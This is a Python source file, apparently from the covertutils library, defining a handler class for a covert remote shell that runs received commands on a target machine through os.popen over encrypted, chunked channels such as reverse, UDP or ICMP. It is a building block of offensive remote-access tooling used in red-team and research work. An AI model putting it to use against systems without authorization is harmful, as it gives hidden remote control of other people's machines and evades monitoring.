from covertutils.exceptions import *

from time import sleep

from abc import ABCMeta, abstractmethod

from covertutils.helpers import defaultArgMerging
from covertutils.handlers import FunctionDictHandler

from covertutils.payloads import LinuxStages, GenericStages

pls = {
	'control' : GenericStages['shell']['marshal'],
}

class SimpleShellHandler ( FunctionDictHandler ) :
	"""
	This class provides an implementation of Simple Remote Shell.
	It can be used on any shell type and protocol (bind, reverse, udp, icmp, etc),by adjusting `send_function()` and `receive_function()`

	All communication is chunked and encrypted, as dictated by the :class:`covertutils.orchestration.SimpleOrchestrator` object.

	This class directly executes commands on a System Shell (Windows or Unix) via the :func:`os.popen` function. The exact stage used to execute commands is explained in :mod:`covertutils.Stages`
"""

	def __init__( self, recv, send, orchestrator, **kw ) :
		"""
:param function receive_function: A **blocking** function that returns every time a chunk is received. The return value must be return raw data.
:param function send_function: A function that takes raw data as argument and sends it across.
:param `orchestration.SimpleOrchestrator` orchestrator: An Object that is used to translate raw_data to `(stream, message)` tuples.
		"""
 		kw['function_dict'] = pls
		super( SimpleShellHandler, self ).__init__( recv, send, orchestrator, **kw )


	def onMessage( self, stream, message ) :
		resp = super( SimpleShellHandler, self ).onMessage( stream, message )
		self.preferred_send( resp, stream )


	def onChunk( self, stream, message ) :
		pass


	def onNotRecognised( self ) :
		pass
